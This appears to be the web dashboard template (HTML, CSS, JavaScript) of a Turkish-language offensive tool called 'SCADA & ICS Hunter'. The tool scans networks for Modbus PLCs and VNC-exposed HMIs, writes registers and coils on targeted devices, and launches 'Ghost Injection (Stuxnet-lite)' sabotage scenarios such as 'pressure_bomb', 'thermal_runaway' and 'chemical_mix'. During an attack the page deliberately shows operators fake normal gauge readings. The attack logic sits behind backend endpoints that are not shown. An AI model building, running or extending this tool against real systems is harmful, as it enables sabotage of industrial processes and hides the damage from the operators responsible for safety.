{% extends "base.html" %}
{% block title %}SCADA & ICS Hunter - End√ºstriyel Casusluk{% endblock %}

{% block extra_css %}
<style>
    .gauge-container {
        display: flex;
        flex-wrap: wrap;
        gap: 20px;
        justify-content: center;
    }
    
    .gauge {
        width: 180px;
        height: 180px;
        position: relative;
        background: linear-gradient(145deg, #1a1a2e, #16213e);
        border-radius: 50%;
        box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
    }
    
    .gauge-value {
        font-size: 2rem;
        font-weight: bold;
        color: #00ff88;
        text-shadow: 0 0 10px #00ff88;
    }
    
    .gauge-label {
        font-size: 0.85rem;
        color: #888;
        text-transform: uppercase;
    }
    
    .gauge.danger .gauge-value {
        color: #ff4444;
        text-shadow: 0 0 10px #ff4444;
    }
    
    .gauge.warning .gauge-value {
        color: #ffaa00;
        text-shadow: 0 0 10px #ffaa00;
    }
    
    .valve-grid {
        display: grid;
        grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
        gap: 15px;
    }
    
    .valve-item {
        background: linear-gradient(145deg, #1a1a2e, #16213e);
        border-radius: 10px;
        padding: 15px;
        text-align: center;
        border: 1px solid #333;
    }
    
    .valve-icon {
        font-size: 2.5rem;
        margin-bottom: 10px;
    }
    
    .valve-open {
        color: #00ff88;
        text-shadow: 0 0 15px #00ff88;
    }
    
    .valve-closed {
        color: #ff4444;
        text-shadow: 0 0 15px #ff4444;
    }
    
    .device-table {
        width: 100%;
        border-collapse: collapse;
    }
    
    .device-table th, .device-table td {
        padding: 12px;
        text-align: left;
        border-bottom: 1px solid #333;
    }
    
    .device-table th {
        background: rgba(0, 255, 136, 0.1);
        color: #00ff88;
    }
    
    .vulnerable-badge {
        background: #ff4444;
        color: white;
        padding: 3px 10px;
        border-radius: 12px;
        font-size: 0.8rem;
    }
    
    .scenario-card {
        background: linear-gradient(145deg, #1a1a2e, #16213e);
        border-radius: 10px;
        padding: 20px;
        margin-bottom: 15px;
        border: 1px solid #333;
        cursor: pointer;
        transition: all 0.3s;
    }
    
    .scenario-card:hover {
        border-color: #00ff88;
        box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
    }
    
    .scenario-card.selected {
        border-color: #ff4444;
        background: linear-gradient(145deg, #2a1a1e, #261316);
    }
    
    .scenario-icon {
        font-size: 2rem;
        margin-bottom: 10px;
    }
    
    .hmi-screenshot {
        background: #111;
        border: 2px solid #333;
        border-radius: 5px;
        padding: 10px;
        text-align: center;
    }
    
    .hmi-screenshot img {
        max-width: 100%;
        border-radius: 3px;
    }
    
    .hmi-placeholder {
        width: 100%;
        height: 200px;
        background: linear-gradient(135deg, #1a1a1a, #0d0d0d);
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        color: #555;
        border-radius: 5px;
    }
    
    .terminal-output {
        background: #0a0a0a;
        border: 1px solid #333;
        border-radius: 5px;
        padding: 15px;
        font-family: 'Courier New', monospace;
        font-size: 0.85rem;
        max-height: 300px;
        overflow-y: auto;
        color: #00ff88;
    }
    
    .injection-active {
        animation: pulse-red 1.5s infinite;
    }
    
    @keyframes pulse-red {
        0%, 100% { box-shadow: 0 0 5px #ff4444; }
        50% { box-shadow: 0 0 30px #ff4444; }
    }
    
    .scan-animation {
        animation: scan-sweep 2s infinite;
    }
    
    @keyframes scan-sweep {
        0% { opacity: 0.5; }
        50% { opacity: 1; }
        100% { opacity: 0.5; }
    }
    
    .protocol-badge {
        display: inline-block;
        padding: 3px 10px;
        border-radius: 15px;
        font-size: 0.75rem;
        margin: 2px;
    }
    
    .protocol-modbus { background: #4CAF50; color: white; }
    .protocol-s7comm { background: #2196F3; color: white; }
    .protocol-ethernetip { background: #9C27B0; color: white; }
    .protocol-dnp3 { background: #FF9800; color: white; }
    .protocol-opcua { background: #795548; color: white; }
    
    .industrial-panel {
        background: linear-gradient(180deg, #2a2a2a, #1a1a1a);
        border: 3px solid #444;
        border-radius: 8px;
        padding: 20px;
        box-shadow: inset 0 0 30px rgba(0,0,0,0.5);
    }
    
    .led-indicator {
        width: 12px;
        height: 12px;
        border-radius: 50%;
        display: inline-block;
        margin-right: 8px;
    }
    
    .led-green {
        background: #00ff00;
        box-shadow: 0 0 10px #00ff00;
    }
    
    .led-red {
        background: #ff0000;
        box-shadow: 0 0 10px #ff0000;
    }
    
    .led-yellow {
        background: #ffff00;
        box-shadow: 0 0 10px #ffff00;
    }
    
    .led-off {
        background: #333;
        box-shadow: none;
    }
</style>
{% endblock %}

{% block content %}
<div class="container-fluid">
    <!-- Header -->
    <div class="row mb-4">
        <div class="col-12">
            <div class="d-flex align-items-center justify-content-between">
                <div>
                    <h1 class="text-success">
                        <i class="fas fa-industry me-2"></i>
                        SCADA & ICS Hunter
                    </h1>
                    <p class="text-muted mb-0">End√ºstriyel Kontrol Sistemleri Sƒ±zma Test Aracƒ±</p>
                </div>
                <div>
                    <span class="badge bg-danger fs-6 me-2" id="injection-status" style="display: none;">
                        <i class="fas fa-radiation me-1"></i> Ghost Injection AKTIF
                    </span>
                    <button class="btn btn-outline-success" onclick="refreshDashboard()">
                        <i class="fas fa-sync-alt me-1"></i> Yenile
                    </button>
                </div>
            </div>
        </div>
    </div>

    <div class="row">
        <!-- Left Panel - Fake HMI Display -->
        <div class="col-lg-8">
            <!-- Fake Process Display -->
            <div class="card bg-dark mb-4">
                <div class="card-header d-flex justify-content-between align-items-center">
                    <span><i class="fas fa-tv me-2"></i>Sahte HMI Ekranƒ± (Operat√∂r G√∂r√ºn√ºm√º)</span>
                    <span class="badge bg-success">
                        <span class="led-indicator led-green"></span> NORMAL
                    </span>
                </div>
                <div class="card-body industrial-panel">
                    <!-- Gauges -->
                    <h5 class="text-secondary mb-3">
                        <i class="fas fa-tachometer-alt me-2"></i>Proses Deƒüerleri
                    </h5>
                    <div class="gauge-container mb-4" id="gauge-container">
                        <div class="gauge" id="gauge-temp">
                            <div class="gauge-value" id="temp-value">72¬∞C</div>
                            <div class="gauge-label">Sƒ±caklƒ±k</div>
                        </div>
                        <div class="gauge" id="gauge-pressure">
                            <div class="gauge-value" id="pressure-value">4.2 bar</div>
                            <div class="gauge-label">Basƒ±n√ß</div>
                        </div>
                        <div class="gauge" id="gauge-flow">
                            <div class="gauge-value" id="flow-value">125 L/m</div>
                            <div class="gauge-label">Akƒ±≈ü</div>
                        </div>
                        <div class="gauge" id="gauge-level">
                            <div class="gauge-value" id="level-value">68%</div>
                            <div class="gauge-label">Tank Seviye</div>
                        </div>
                    </div>
                    
                    <!-- Valve States -->
                    <h5 class="text-secondary mb-3">
                        <i class="fas fa-cog me-2"></i>Vana Durumlarƒ±
                    </h5>
                    <div class="valve-grid" id="valve-grid">
                        <div class="valve-item">
                            <div class="valve-icon valve-open">‚öôÔ∏è</div>
                            <div class="text-white">V-101</div>
                            <div class="text-success small">A√áIK</div>
                        </div>
                        <div class="valve-item">
                            <div class="valve-icon valve-closed">‚öôÔ∏è</div>
                            <div class="text-white">V-102</div>
                            <div class="text-danger small">KAPALI</div>
                        </div>
                        <div class="valve-item">
                            <div class="valve-icon valve-open">‚öôÔ∏è</div>
                            <div class="text-white">V-103</div>
                            <div class="text-success small">A√áIK</div>
                        </div>
                        <div class="valve-item">
                            <div class="valve-icon valve-open">‚öôÔ∏è</div>
                            <div class="text-white">V-104</div>
                            <div class="text-success small">A√áIK</div>
                        </div>
                        <div class="valve-item">
                            <div class="valve-icon valve-closed">‚öôÔ∏è</div>
                            <div class="text-white">V-105</div>
                            <div class="text-danger small">KAPALI</div>
                        </div>
                        <div class="valve-item">
                            <div class="valve-icon valve-open">‚öôÔ∏è</div>
                            <div class="text-white">PUMP-1</div>
                            <div class="text-success small">√áALI≈ûIYOR</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Discovered Devices -->
            <div class="card bg-dark mb-4">
                <div class="card-header d-flex justify-content-between align-items-center">
                    <span><i class="fas fa-network-wired me-2"></i>Ke≈üfedilen PLC/SCADA Cihazlarƒ±</span>
                    <button class="btn btn-sm btn-outline-success" onclick="scanModbus()">
                        <i class="fas fa-search me-1"></i> Aƒüƒ± Tara
                    </button>
                </div>
                <div class="card-body">
                    <div class="table-responsive">
                        <table class="device-table" id="device-table">
                            <thead>
                                <tr>
                                    <th>IP Adresi</th>
                                    <th>Port</th>
                                    <th>Protokol</th>
                                    <th>√úretici</th>
                                    <th>Model</th>
                                    <th>Durum</th>
                                    <th>ƒ∞≈ülem</th>
                                </tr>
                            </thead>
                            <tbody id="device-tbody">
                                <tr>
                                    <td colspan="7" class="text-center text-muted py-4">
                                        <i class="fas fa-info-circle me-2"></i>
                                        Cihaz taramasƒ± ba≈ülatƒ±lmadƒ±
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>

            <!-- HMI Screenshots -->
            <div class="card bg-dark">
                <div class="card-header d-flex justify-content-between align-items-center">
                    <span><i class="fas fa-camera me-2"></i>HMI Ekran G√∂r√ºnt√ºleri (VNC)</span>
                    <button class="btn btn-sm btn-outline-info" onclick="scanHMIs()">
                        <i class="fas fa-desktop me-1"></i> HMI Tara
                    </button>
                </div>
                <div class="card-body">
                    <div class="row" id="screenshots-grid">
                        <div class="col-12">
                            <div class="hmi-placeholder">
                                <i class="fas fa-desktop fa-3x mb-3"></i>
                                <p>HMI taramasƒ± ba≈ülatƒ±lmadƒ±</p>
                                <small class="text-secondary">Windows CE/XP panelleri VNC √ºzerinden yakalanƒ±r</small>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Right Panel - Attack Controls -->
        <div class="col-lg-4">
            <!-- Network Scan Config -->
            <div class="card bg-dark mb-4">
                <div class="card-header">
                    <i class="fas fa-crosshairs me-2"></i>Hedef Yapƒ±landƒ±rma
                </div>
                <div class="card-body">
                    <div class="mb-3">
                        <label class="form-label text-secondary">IP Aralƒ±ƒüƒ±</label>
                        <input type="text" class="form-control bg-dark text-white" 
                               id="ip-range" value="192.168.1.0/24" 
                               placeholder="192.168.1.0/24">
                    </div>
                    <div class="mb-3">
                        <label class="form-label text-secondary">Hedef IP (Tekil)</label>
                        <input type="text" class="form-control bg-dark text-white" 
                               id="target-ip" placeholder="192.168.1.100">
                    </div>
                    <div class="mb-3">
                        <label class="form-label text-secondary">Unit ID</label>
                        <input type="number" class="form-control bg-dark text-white" 
                               id="unit-id" value="1" min="1" max="255">
                    </div>
                </div>
            </div>

            <!-- Ghost Injection Scenarios -->
            <div class="card bg-dark mb-4">
                <div class="card-header">
                    <i class="fas fa-ghost me-2 text-danger"></i>Ghost Injection (Stuxnet-lite)
                </div>
                <div class="card-body">
                    <p class="text-muted small mb-3">
                        <i class="fas fa-exclamation-triangle text-warning me-1"></i>
                        Operat√∂re sahte deƒüerler g√∂sterilirken ger√ßek deƒüerler manip√ºle edilir
                    </p>
                    
                    <div id="scenario-list">
                        {% for key, scenario in scenarios.items() %}
                        <div class="scenario-card" onclick="selectScenario('{{ key }}')" id="scenario-{{ key }}">
                            <div class="d-flex align-items-center">
                                <span class="scenario-icon me-3">
                                    {% if key == 'centrifuge_sabotage' %}üîÑ
                                    {% elif key == 'pressure_bomb' %}üí£
                                    {% elif key == 'thermal_runaway' %}üî•
                                    {% elif key == 'overflow_attack' %}üåä
                                    {% elif key == 'chemical_mix' %}‚ò¢Ô∏è
                                    {% else %}‚öôÔ∏è{% endif %}
                                </span>
                                <div>
                                    <strong class="text-white">{{ scenario.name }}</strong>
                                    <div class="text-muted small">{{ scenario.description }}</div>
                                </div>
                            </div>
                        </div>
                        {% endfor %}
                    </div>
                    
                    <div class="mt-3">
                        <label class="form-label text-secondary">S√ºre (saniye)</label>
                        <input type="number" class="form-control bg-dark text-white" 
                               id="injection-duration" value="60" min="10" max="3600">
                    </div>
                    
                    <div class="d-grid gap-2 mt-3">
                        <button class="btn btn-danger" onclick="startGhostInjection()" id="btn-start-injection">
                            <i class="fas fa-radiation me-1"></i> Ghost Injection Ba≈ülat
                        </button>
                        <button class="btn btn-outline-warning" onclick="stopGhostInjection()" id="btn-stop-injection" style="display: none;">
                            <i class="fas fa-stop me-1"></i> Durdur
                        </button>
                    </div>
                </div>
            </div>

            <!-- Manual Modbus Control -->
            <div class="card bg-dark mb-4">
                <div class="card-header">
                    <i class="fas fa-sliders-h me-2"></i>Manuel Modbus Kontrol√º
                </div>
                <div class="card-body">
                    <div class="row mb-3">
                        <div class="col-6">
                            <label class="form-label text-secondary small">Adres</label>
                            <input type="number" class="form-control bg-dark text-white form-control-sm" 
                                   id="register-address" value="0" min="0">
                        </div>
                        <div class="col-6">
                            <label class="form-label text-secondary small">Deƒüer</label>
                            <input type="number" class="form-control bg-dark text-white form-control-sm" 
                                   id="register-value" value="0">
                        </div>
                    </div>
                    <div class="btn-group w-100 mb-2">
                        <button class="btn btn-sm btn-outline-info" onclick="readRegisters()">
                            <i class="fas fa-book-open me-1"></i> Oku
                        </button>
                        <button class="btn btn-sm btn-outline-warning" onclick="writeRegister()">
                            <i class="fas fa-pen me-1"></i> Yaz
                        </button>
                    </div>
                    <div class="btn-group w-100">
                        <button class="btn btn-sm btn-outline-success" onclick="readCoils()">
                            <i class="fas fa-toggle-on me-1"></i> Coil Oku
                        </button>
                        <button class="btn btn-sm btn-outline-danger" onclick="writeCoil()">
                            <i class="fas fa-toggle-off me-1"></i> Coil Yaz
                        </button>
                    </div>
                </div>
            </div>

            <!-- Terminal Output -->
            <div class="card bg-dark">
                <div class="card-header d-flex justify-content-between align-items-center">
                    <span><i class="fas fa-terminal me-2"></i>Terminal √áƒ±ktƒ±sƒ±</span>
                    <button class="btn btn-sm btn-outline-secondary" onclick="clearTerminal()">
                        <i class="fas fa-trash"></i>
                    </button>
                </div>
                <div class="card-body p-0">
                    <div class="terminal-output" id="terminal-output">
                        <div class="text-success">SCADA Hunter v1.0 initialized</div>
                        <div class="text-secondary">[*] Awaiting commands...</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}

{% block extra_js %}
<script>
let selectedScenario = 'pressure_bomb';
let activeInjectionId = null;
let hmiUpdateInterval = null;

function log(message, type = 'info') {
    const terminal = document.getElementById('terminal-output');
    const timestamp = new Date().toLocaleTimeString();
    let color = 'text-secondary';
    let prefix = '[*]';
    
    if (type === 'success') { color = 'text-success'; prefix = '[+]'; }
    else if (type === 'error') { color = 'text-danger'; prefix = '[-]'; }
    else if (type === 'warning') { color = 'text-warning'; prefix = '[!]'; }
    else if (type === 'attack') { color = 'text-danger'; prefix = '[üíÄ]'; }
    
    terminal.innerHTML += `<div class="${color}">${prefix} [${timestamp}] ${message}</div>`;
    terminal.scrollTop = terminal.scrollHeight;
}

function clearTerminal() {
    document.getElementById('terminal-output').innerHTML = 
        '<div class="text-success">Terminal cleared</div>';
}

function selectScenario(scenario) {
    document.querySelectorAll('.scenario-card').forEach(card => {
        card.classList.remove('selected');
    });
    document.getElementById('scenario-' + scenario).classList.add('selected');
    selectedScenario = scenario;
    log(`Selected scenario: ${scenario}`, 'info');
}

async function scanModbus() {
    const ipRange = document.getElementById('ip-range').value;
    log(`Scanning Modbus devices on ${ipRange}...`, 'info');
    
    try {
        const response = await fetch('/scada/api/modbus/scan', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ip_range: ipRange })
        });
        const data = await response.json();
        
        if (data.success) {
            log(`Found ${data.devices_found} Modbus device(s)`, 'success');
            updateDeviceTable(data.devices);
        } else {
            log(`Scan failed: ${data.error}`, 'error');
        }
    } catch (error) {
        log(`Network error: ${error.message}`, 'error');
    }
}

function updateDeviceTable(devices) {
    const tbody = document.getElementById('device-tbody');
    
    if (devices.length === 0) {
        tbody.innerHTML = `<tr><td colspan="7" class="text-center text-muted py-4">
            No devices found</td></tr>`;
        return;
    }
    
    tbody.innerHTML = devices.map(device => `
        <tr>
            <td><code>${device.ip}</code></td>
            <td>${device.port}</td>
            <td><span class="protocol-badge protocol-modbus">${device.protocol}</span></td>
            <td>${device.vendor}</td>
            <td>${device.model || '-'}</td>
            <td>${device.is_vulnerable ? '<span class="vulnerable-badge">VULNERABLE</span>' : '<span class="badge bg-secondary">Unknown</span>'}</td>
            <td>
                <button class="btn btn-sm btn-outline-danger" onclick="setTarget('${device.ip}')">
                    <i class="fas fa-crosshairs"></i>
                </button>
            </td>
        </tr>
    `).join('');
}

function setTarget(ip) {
    document.getElementById('target-ip').value = ip;
    log(`Target set to ${ip}`, 'success');
}

async function startGhostInjection() {
    const targetIp = document.getElementById('target-ip').value;
    const duration = document.getElementById('injection-duration').value;
    
    if (!targetIp) {
        log('Target IP required!', 'error');
        return;
    }
    
    log(`Starting Ghost Injection: ${selectedScenario} on ${targetIp}`, 'attack');
    
    try {
        const response = await fetch('/scada/api/ghost/start', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                target_ip: targetIp,
                scenario: selectedScenario,
                duration: parseInt(duration)
            })
        });
        const data = await response.json();
        
        if (data.success) {
            activeInjectionId = data.injection_id;
            log(`Ghost Injection ACTIVE! ID: ${activeInjectionId}`, 'attack');
            
            document.getElementById('injection-status').style.display = 'inline-block';
            document.getElementById('btn-start-injection').style.display = 'none';
            document.getElementById('btn-stop-injection').style.display = 'block';
            
            // Start fake HMI updates
            startFakeHMIUpdates();
        } else {
            log(`Failed: ${data.error}`, 'error');
        }
    } catch (error) {
        log(`Error: ${error.message}`, 'error');
    }
}

async function stopGhostInjection() {
    if (!activeInjectionId) return;
    
    log(`Stopping Ghost Injection ${activeInjectionId}...`, 'warning');
    
    try {
        const response = await fetch('/scada/api/ghost/stop', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ injection_id: activeInjectionId })
        });
        
        activeInjectionId = null;
        document.getElementById('injection-status').style.display = 'none';
        document.getElementById('btn-start-injection').style.display = 'block';
        document.getElementById('btn-stop-injection').style.display = 'none';
        
        if (hmiUpdateInterval) {
            clearInterval(hmiUpdateInterval);
            hmiUpdateInterval = null;
        }
        
        log('Ghost Injection stopped', 'success');
    } catch (error) {
        log(`Error stopping: ${error.message}`, 'error');
    }
}

function startFakeHMIUpdates() {
    // Show fake "normal" values while attack is happening
    hmiUpdateInterval = setInterval(() => {
        updateFakeGauges();
    }, 1000);
}

function updateFakeGauges() {
    // These show FAKE normal values to the operator
    const fakeTemp = (70 + Math.random() * 5).toFixed(1);
    const fakePressure = (4.0 + Math.random() * 0.5).toFixed(1);
    const fakeFlow = (120 + Math.random() * 10).toFixed(0);
    const fakeLevel = (65 + Math.random() * 10).toFixed(0);
    
    document.getElementById('temp-value').textContent = fakeTemp + '¬∞C';
    document.getElementById('pressure-value').textContent = fakePressure + ' bar';
    document.getElementById('flow-value').textContent = fakeFlow + ' L/m';
    document.getElementById('level-value').textContent = fakeLevel + '%';
}

async function readRegisters() {
    const targetIp = document.getElementById('target-ip').value;
    const address = document.getElementById('register-address').value;
    
    if (!targetIp) {
        log('Target IP required!', 'error');
        return;
    }
    
    log(`Reading registers from ${targetIp} @ address ${address}`, 'info');
    
    try {
        const response = await fetch('/scada/api/modbus/read-registers', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                target_ip: targetIp,
                start_address: parseInt(address),
                count: 10
            })
        });
        const data = await response.json();
        
        if (data.success) {
            log(`Registers: ${JSON.stringify(data.registers)}`, 'success');
        } else {
            log(`Failed: ${data.error}`, 'error');
        }
    } catch (error) {
        log(`Error: ${error.message}`, 'error');
    }
}

async function writeRegister() {
    const targetIp = document.getElementById('target-ip').value;
    const address = document.getElementById('register-address').value;
    const value = document.getElementById('register-value').value;
    
    if (!targetIp) {
        log('Target IP required!', 'error');
        return;
    }
    
    log(`Writing ${value} to register ${address} @ ${targetIp}`, 'attack');
    
    try {
        const response = await fetch('/scada/api/modbus/write-register', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                target_ip: targetIp,
                address: parseInt(address),
                value: parseInt(value)
            })
        });
        const data = await response.json();
        
        if (data.success) {
            log(`Register written successfully!`, 'success');
        } else {
            log(`Failed: ${data.error}`, 'error');
        }
    } catch (error) {
        log(`Error: ${error.message}`, 'error');
    }
}

async function readCoils() {
    const targetIp = document.getElementById('target-ip').value;
    const address = document.getElementById('register-address').value;
    
    if (!targetIp) {
        log('Target IP required!', 'error');
        return;
    }
    
    log(`Reading coils from ${targetIp} @ address ${address}`, 'info');
    
    try {
        const response = await fetch('/scada/api/modbus/read-coils', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                target_ip: targetIp,
                start_address: parseInt(address),
                count: 16
            })
        });
        const data = await response.json();
        
        if (data.success) {
            log(`Coils: ${JSON.stringify(data.coils)}`, 'success');
        } else {
            log(`Failed: ${data.error}`, 'error');
        }
    } catch (error) {
        log(`Error: ${error.message}`, 'error');
    }
}

async function writeCoil() {
    const targetIp = document.getElementById('target-ip').value;
    const address = document.getElementById('register-address').value;
    const value = document.getElementById('register-value').value;
    
    if (!targetIp) {
        log('Target IP required!', 'error');
        return;
    }
    
    log(`Writing coil ${address} = ${value > 0 ? 'ON' : 'OFF'} @ ${targetIp}`, 'attack');
    
    try {
        const response = await fetch('/scada/api/modbus/write-coil', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                target_ip: targetIp,
                address: parseInt(address),
                value: parseInt(value) > 0
            })
        });
        const data = await response.json();
        
        if (data.success) {
            log(`Coil written successfully!`, 'success');
        } else {
            log(`Failed: ${data.error}`, 'error');
        }
    } catch (error) {
        log(`Error: ${error.message}`, 'error');
    }
}

async function scanHMIs() {
    const ipRange = document.getElementById('ip-range').value;
    log(`Scanning for HMI systems on ${ipRange}...`, 'info');
    
    try {
        const response = await fetch('/scada/api/hmi/scan', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ip_range: ipRange })
        });
        const data = await response.json();
        
        if (data.success) {
            log(`Found ${data.hmis_found} HMI system(s)`, 'success');
            updateHMIGrid(data.hmis);
        } else {
            log(`Scan failed: ${data.error}`, 'error');
        }
    } catch (error) {
        log(`Error: ${error.message}`, 'error');
    }
}

function updateHMIGrid(hmis) {
    const grid = document.getElementById('screenshots-grid');
    
    if (hmis.length === 0) {
        grid.innerHTML = `<div class="col-12">
            <div class="hmi-placeholder">
                <i class="fas fa-desktop fa-3x mb-3"></i>
                <p>No HMI systems found</p>
            </div>
        </div>`;
        return;
    }
    
    grid.innerHTML = hmis.map(hmi => `
        <div class="col-md-6 mb-3">
            <div class="hmi-screenshot">
                <div class="d-flex justify-content-between align-items-center mb-2">
                    <span class="text-white">${hmi.ip}:${hmi.port}</span>
                    <button class="btn btn-sm btn-success" onclick="captureScreenshot('${hmi.ip}', ${hmi.port})">
                        <i class="fas fa-camera"></i>
                    </button>
                </div>
                <div class="hmi-placeholder" id="hmi-img-${hmi.ip.replace(/\./g, '-')}">
                    <i class="fas fa-desktop fa-2x mb-2"></i>
                    <small>${hmi.type || 'Unknown HMI'}</small>
                </div>
            </div>
        </div>
    `).join('');
}

async function captureScreenshot(ip, port) {
    log(`Capturing screenshot from ${ip}:${port} via VNC...`, 'info');
    
    try {
        const response = await fetch('/scada/api/hmi/screenshot', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ target_ip: ip, target_port: port })
        });
        const data = await response.json();
        
        if (data.success) {
            log(`Screenshot captured! ${data.width}x${data.height}`, 'success');
        } else {
            log(`Failed: ${data.error}`, 'error');
        }
    } catch (error) {
        log(`Error: ${error.message}`, 'error');
    }
}

function refreshDashboard() {
    log('Refreshing dashboard...', 'info');
    location.reload();
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    selectScenario('pressure_bomb');
});
</script>
{% endblock %}
